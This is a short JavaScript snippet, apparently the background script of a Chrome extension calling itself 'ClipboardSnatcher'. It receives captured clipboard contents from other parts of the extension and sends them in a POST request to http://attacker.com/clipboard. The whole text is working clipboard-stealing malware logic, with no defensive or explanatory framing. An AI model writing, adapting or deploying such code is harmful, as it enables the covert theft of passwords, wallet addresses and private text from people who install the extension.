chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === "CLIPBOARD_CAPTURE") {
    console.log("[ClipboardSnatcher] Captured:", msg.data);

    fetch("http://attacker.com/clipboard", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(msg.data)
    }).catch(err =>
      console.error("[ClipboardSnatcher] Failed to send:", err)
    );
  }
});
